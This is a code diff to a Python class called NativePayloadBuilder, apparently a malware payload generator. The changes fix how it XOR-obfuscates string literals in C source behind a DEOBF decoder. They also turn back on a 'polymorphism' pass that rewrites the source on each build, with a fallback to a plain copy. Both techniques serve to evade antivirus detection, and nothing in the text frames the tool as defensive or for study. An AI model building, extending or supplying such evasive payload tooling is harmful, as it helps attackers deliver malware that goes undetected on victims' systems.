@@ -62,7 +62,7 @@ class NativePayloadBuilder:
                 encrypted.append(f"\\x{ord(char) ^ xor_key:02x}")
             
             # Return obfuscated string with deobfuscation code
-            return f'DEOBF("{{"{"".join(encrypted)}"}}", {xor_key})'
+            return f'DEOBF("{"".join(encrypted)}", {xor_key})'
         
         # Find and replace string literals (but not in preprocessor directives)
         pattern = r'"([^"\\]*(\\.[^"\\]*)*)"'
@@ -172,16 +172,30 @@ static int {func_name}(int x) {{
         if not main_source.exists():
             return {'success': False, 'error': 'Source files not found'}
         
-        # For now, disable polymorphism to ensure stable compilation
-        # poly_source = self.apply_polymorphism(main_source) if main_source.exists() else None
-        
+        # Apply polymorphism with better error handling
         if not main_source.exists():
             return {'success': False, 'error': 'Main source file not found'}
         
-        # Just copy the source without polymorphism for stability
-        import shutil
-        poly_source = self.build_path / "stable_main.c"
-        shutil.copy(main_source, poly_source)
+        try:
+            # Try polymorphism but fall back if it fails
+            poly_source = self.apply_polymorphism(main_source)
+            
+            # Verify the output is valid C code
+            if not poly_source or not poly_source.exists():
+                raise ValueError("Polymorphism failed")
+                
+            # Quick syntax check
+            with open(poly_source) as f:
+                content = f.read()
+                if '#include' not in content or 'main' not in content:
+                    raise ValueError("Polymorphism corrupted the code")
+                    
+        except Exception as e:
+            # Fall back to simple copy
+            import shutil
+            poly_source = self.build_path / "stable_main.c"
+            shutil.copy(main_source, poly_source)
+            print(f"Warning: Polymorphism disabled due to: {e}")
         
         # Set compiler based on platform
         if platform == "windows":
